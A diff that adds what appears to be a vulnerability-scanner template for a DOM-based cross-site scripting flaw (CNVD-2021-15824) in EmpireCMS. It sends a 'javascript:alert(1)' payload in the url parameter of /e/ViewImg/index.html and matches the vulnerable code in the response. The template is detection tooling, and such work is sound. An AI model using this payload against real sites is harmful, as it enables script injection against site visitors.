@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - if(Request("url")!=0)
+            - href=\""+Request("url")+"\"
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(1)'
+id: CNVD-2021-15824
+info:
+    author: daffainfo
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+        cvss-score: 7.2
+        cwe-id: CWE-79
+    description: EmpireCMS is vulnerable to a DOM based cross-site scripting attack.
+    metadata:
+        max-request: 1
+    name: EmpireCMS DOM Cross Site-Scripting
+    reference:
+        - https://sourceforge.net/projects/empirecms/
+        - https://www.bilibili.com/read/cv10441910
+        - https://vul.wangan.com/a/CNVD-2021-15824
+    severity: high
+    tags:
+        - empirecms
+        - domxss
+        - irecms
+        - EmpireCMS
